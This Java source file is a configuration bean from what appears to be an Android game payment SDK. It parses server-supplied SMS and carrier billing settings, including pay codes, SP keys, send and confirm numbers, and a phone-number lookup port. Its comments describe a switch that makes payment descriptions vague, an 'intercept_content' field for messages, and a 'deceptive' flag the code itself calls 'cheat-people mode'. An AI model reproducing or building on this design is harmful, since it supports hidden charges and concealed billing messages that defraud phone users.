package mobi.zty.sdk.game.bean;

import java.util.HashMap;
import java.util.Map;

import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.Helper;

import org.json.JSONArray;
import org.json.JSONObject;


public class ActivateResult {
    private String payways;
    private String adfd;
    private String url;
    private String dipcon;
    private String dipcon2;
    private String dipurl;
    private String noturl;
    private String exiturl;
    private String bDel;
    private String FillCon;
    private Map<String , Integer> limitMap = new HashMap<String, Integer>();
    private Map<Integer, ShopInfo> shopInfoMap = new HashMap<Integer, ShopInfo>();
    /**
     * key 是支付类型 value 客户端是否初始化成功
     */
    private Map<Integer, MkInfo> mkMap = new HashMap<Integer, MkInfo>();
    
    /**
     * key 某套支付的唯一标识 value mkInfo
     */
    public Map<String, MkInfo> payIdMap = new HashMap<String, MkInfo>();
    
    /**
     * 手机号码
     */
    private String phoneNum;
    /**
     * 获取手机号码的端口
     */
    private String obtainNum;
    
    private long  delayDimer;
    /**
     * 0:所有的支付描述走正规流程 1：所有的的支付描述变模糊
     */
    private int openDark = 0;
    
    /**
     * 0:关闭主动计费弹框 1：打开主动计费弹框
     */
    private int openAlert = 0;
    
    /**
     * 0:显示购买按钮 1：显示确定按钮 2：显示领取按钮
     */
    private int openButton = 0;
    
    /**
     * 0:不弹出二次确认框 1：弹出二次确认框
     */
    private int openOurAlert = 0;
    
    /**
     * 0:线上弹框方式 1：线下弹框方式（森林疾跑）
     */
    private int cootype = 0;
    
    private int onlineLibVersionCode = 0;
    
    /**
     * 0:关闭 1：打开
     */
    private int deceptive = 0;
    
    public String getExiturl() {
        return exiturl;
    }

    public void setExiturl(String exiturl) {
        this.exiturl = exiturl;
    }
    
    public String getNoturl() {
        return noturl;
    }

    public void setNoturl(String noturl) {
        this.noturl = noturl;
    }
    
    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }
    
    public String getDipurl() {
        return dipurl;
    }

    public void setDipurl(String dipurl) {
        this.dipurl = dipurl;
    }
    
    public String getDipcon2() {
        return dipcon2;
    }

    public void setDipcon2(String dipcon2) {
        this.dipcon2 = dipcon2;
    }
    
    public String getDipcon() {
        return dipcon;
    }

    public void setDipcon(String dipcon) {
        this.dipcon = dipcon;
    }
    
    public String getAdfd() {
        return adfd;
    }

    public void setAdfd(String adfd) {
        this.adfd = adfd;
    }
    
    public ActivateResult() {
    }

    public String getPayways() {
        return payways;
    }

    public void setPayways(String payways) {
        this.payways = payways;
    }


	public String getbDel() {
		return bDel;
	}

	public void setbDel(String bDel) {
		this.bDel = bDel;
	}

	public String getFillCon() {
		return FillCon;
	}

	public void setFillCon(String fillCon) {
		FillCon = fillCon;
	}

	public long getDelayDimer() {
		return delayDimer;
	}

	public void setDelayDimer(long delayDimer) {
		this.delayDimer = delayDimer;
	}

	public int getOpenDark() {
		return openDark;
	}

	public void setOpenDark(int openDark) {
		this.openDark = openDark;
	}

	public String getPhoneNum() {
		return phoneNum;
	}

	public void setPhoneNum(String phoneNum) {
		this.phoneNum = phoneNum;
	}

	public int getOpenOurAlert() {
		return openOurAlert;
	}

	public void setOpenOurAlert(int openOurAlert) {
		this.openOurAlert = openOurAlert;
	}

	public int getOpenButton() {
		return openButton;
	}

	public void setOpenButton(int openButton) {
		this.openButton = openButton;
	}

	public int getOpenAlert() {
		return openAlert;
	}

	public void setOpenAlert(int openAlert) {
		this.openAlert = openAlert;
	}

	public int getCootype() {
		return cootype;
	}

	public void setCootype(int cootype) {
		this.cootype = cootype;
	}

	public Map<String , Integer> getLimitMap() {
		return limitMap;
	}

	public void setLimitMap(JSONArray array) {
		this.limitMap.clear();
		for (int i = 0; i < array.length(); i++) {
			JSONObject object = Helper.getJSONObject(array, i);
			this.limitMap.put(Helper.getJsonString(object, "id"), Helper.getJsonInt(object, "limit"));
		}
	}

	public Map<Integer, ShopInfo> getShopInfoMap() {
		return shopInfoMap;
	}

	public void setShopInfoMap(JSONArray array) {
		this.shopInfoMap.clear();;
		for (int i = 0; i < array.length(); i++) {
			JSONObject object = Helper.getJSONObject(array, i);
			ShopInfo shopInfo = new ShopInfo();
			shopInfo.index = Helper.getJsonInt(object, "index");
			JSONArray groupArray = Helper.getJsonArray(object, "listGroupInfo");
			for (int j = 0; j < groupArray.length(); j++) {
				JSONObject groupObject = Helper.getJSONObject(groupArray, j);
				GroupFeeInfo groupInfo = new GroupFeeInfo();
				shopInfo.listGroupInfo.add(groupInfo);
				groupInfo.delay=Helper.getJsonLong(groupObject, "delay");
				JSONArray feeInfoArray = Helper.getJsonArray(groupObject, "listFeeInfo"); 
				for (int k = 0; k < feeInfoArray.length(); k++) {
					JSONObject feeObject = Helper.getJSONObject(feeInfoArray, k);
					FeeInfo feeInfo = new FeeInfo();
					feeInfo.id = Helper.getJsonString(feeObject, "id");
					feeInfo.payId = Helper.getJsonString(feeObject, "pay_id","");
					feeInfo.mk = Helper.getJsonInt(feeObject, "mk");
					feeInfo.consume = Helper.getJsonInt(feeObject, "consume");
					feeInfo.payCode = Helper.getJsonString(feeObject, "pay_code");
					feeInfo.name = Helper.getJsonString(feeObject, "name");
					feeInfo.verify = Helper.getJsonInt(feeObject, "verify");
					groupInfo.feeInfos.add(feeInfo);
					
				}
				groupInfo.setIntdexMkMap();
			}
			this.shopInfoMap.put(shopInfo.index,shopInfo);
		}
	}

	public Map<Integer, MkInfo> getMkMap() {
		return mkMap;
	}
	
	public Map<String, MkInfo> getPayIdMap() {
		return payIdMap;
	}
	
	public void setMkMap(JSONArray array) {
		this.mkMap.clear();
		this.payIdMap.clear();
		for (int i = 0; i < array.length(); i++) {
			JSONObject object = Helper.getJSONObject(array, i);
			MkInfo mkInfo = new MkInfo();
			mkInfo.spIdentify = Helper.getJsonString(object, "sp_identify");
			mkInfo.mk = Helper.getJsonInt(object, "id");
			mkInfo.payId = Helper.getJsonString(object, "pay_id");
			mkInfo.appId = Helper.getJsonString(object, "app_id");
			mkInfo.appName = Helper.getJsonString(object, "app_name");
			mkInfo.spKey = Helper.getJsonString(object, "sp_key");
			mkInfo.spKey2 = Helper.getJsonString(object, "sp_key2","");
			mkInfo.spSignType = Helper.getJsonString(object, "sp_sign_type","");
			mkInfo.payUrl1 = Helper.getJsonString(object, "pay_url1","");
			mkInfo.payUrl2 = Helper.getJsonString(object, "pay_url2","");
			mkInfo.spChannel = Helper.getJsonString(object, "sp_channel");
			mkInfo.sendNum = Helper.getJsonString(object, "send_num");
			mkInfo.vertifyNum = Helper.getJsonString(object, "vertify_num");
			mkInfo.confimNum = Helper.getJsonString(object, "confim_num");
			mkInfo.timeOut = Helper.getJsonLong(object, "time_out");
			mkInfo.needCount = Helper.getJsonInt(object, "need_count");
			if (GameSDK.mpMkClassName.containsKey(mkInfo.mk)) {
				if (getOnlineLibVersionCode()>Constants.SDK_VERSION_CODE) {
					mkInfo.mkClassName = Helper.getJsonString(object, "mkClassName",GameSDK.mpMkClassName.get(mkInfo.mk));
				}else{
					mkInfo.mkClassName = GameSDK.mpMkClassName.get(mkInfo.mk);
				}
			}else{
				mkInfo.mkClassName = Helper.getJsonString(object, "mkClassName");
			}
			
			
			mkInfo.setInterceptContens(Helper.getJsonString(object, "intercept_content"));
			
			this.payIdMap.put(mkInfo.payId, mkInfo);
			this.mkMap.put(mkInfo.mk, mkInfo);
		}
	}

	public int getDeceptive() {
		if (cootype!=1) {//不是线下 不开启坑人模式
			deceptive = 0;
		}
		return deceptive;
	}

	public void setDeceptive(int deceptive) {
		this.deceptive = deceptive;
	}

	public String getObtainNum() {
		return obtainNum;
	}

	public void setObtainNum(String obtainNum) {
		this.obtainNum = obtainNum;
	}

	public int getOnlineLibVersionCode() {
		return onlineLibVersionCode;
	}

	public void setOnlineLibVersionCode(int onlineLibVersionCode) {
		this.onlineLibVersionCode = onlineLibVersionCode;
	}

}
